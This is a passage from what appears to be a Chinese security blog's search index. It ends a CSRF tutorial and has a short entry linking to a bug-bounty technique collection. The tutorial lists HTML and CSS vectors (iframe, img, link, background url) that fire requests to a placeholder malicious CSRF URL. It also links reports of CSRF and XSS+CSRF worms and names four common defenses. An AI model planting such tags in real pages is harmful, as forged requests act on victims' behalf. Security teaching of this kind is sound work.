class="string">&quot;恶意CSRF_URL&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line">3. img标签利用</span><br><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;恶意CSRF_URL&quot;</span>/&gt;</span><br><span class="line">远程加载图片，这个利用点一般在引入远程图片时，例如 头像</span><br><span class="line">4.link标签利用</span><br><span class="line">&lt;link <span class="attribute">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attribute">type</span>=<span class="string">&#x27;text/css&#x27;</span> <span class="attribute">href</span>=<span class="string">&quot;恶意CSRF_URL&quot;</span>&gt;</span><br><span class="line">4. CSS - backgroud利用</span><br><span class="line">利用 CSS中 background样式中的url来加载远程机器上的内容，从而对url中的内容发送HTTP请求</span><br><span class="line">body</span><br><span class="line">&#123;background:url(<span class="string">&quot;恶意CSRF_URL&quot;</span>);&#125;</span><br></pre></td></tr></table></figure><h2 id="CSRF蠕虫"><a href="#CSRF蠕虫" class="headerlink" title="CSRF蠕虫"></a>CSRF蠕虫</h2><h5 id="音悦台一处CSRF（2）-已经证明可构造蠕虫"><a href="#音悦台一处CSRF（2）-已经证明可构造蠕虫" class="headerlink" title="音悦台一处CSRF（2）[已经证明可构造蠕虫]"></a>音悦台一处CSRF（2）[已经证明可构造蠕虫]</h5><p><a href="https://wooyun.website/show.php?uid=0uuWjJIpThFyMfSHQaiWRvV9YutUbbnmD9NAz6MD">https://wooyun.website/show.php?uid=0uuWjJIpThFyMfSHQaiWRvV9YutUbbnmD9NAz6MD</a></p><h2 id="XSS-CSRF组合拳"><a href="#XSS-CSRF组合拳" class="headerlink" title="XSS+CSRF组合拳"></a>XSS+CSRF组合拳</h2><p>普通的CSRF需要诱导受害者点击构造的CSRF连接，但当CSRF与XSS组合之后，就能实现无意识的攻击了</p><h5 id="壹心理存储型XSS-CSRF造成蠕虫攻击"><a href="#壹心理存储型XSS-CSRF造成蠕虫攻击" class="headerlink" title="壹心理存储型XSS+CSRF造成蠕虫攻击"></a>壹心理存储型XSS+CSRF造成蠕虫攻击</h5><p><a href="https://wooyun.website/show.php?uid=wWfl0XRqzAeneYfhEsjb0tmnQ71JE6xqubtOH5kl">https://wooyun.website/show.php?uid=wWfl0XRqzAeneYfhEsjb0tmnQ71JE6xqubtOH5kl</a></p><h2 id="在业界目前防御-CSRF-攻击主要有四种策略"><a href="#在业界目前防御-CSRF-攻击主要有四种策略" class="headerlink" title="在业界目前防御 CSRF 攻击主要有四种策略"></a>在业界目前防御 CSRF 攻击主要有四种策略</h2><ol><li>验证 HTTP Referer 字段；</li><li>在请求地址中添加 token 并验证；</li><li>在 HTTP 头中自定义属性并验证；</li><li>Chrome 浏览器端启用 SameSite cookie</li></ol><p>对于绕过的方法，之后再讲</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞研究 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SRC姿势(一)</title>
      <link href="/2022/04/14/SRC%E5%A7%BF%E5%8A%BF(%E4%B8%80)/"/>
      <url>/2022/04/14/SRC%E5%A7%BF%E5%8A%BF(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<h1 id="SRC姿势-一"><a href="#SRC姿势-一" class="headerlink" title="SRC姿势(一)"></a>SRC姿势(一)</h1><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204141050517.png"></p><p>github地址：<a href="https://github.com/LiAoRJ/src">LiAoRJ&#x2F;src: SRC姿势收集 (github.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> SRC姿势 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SRC姿势 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
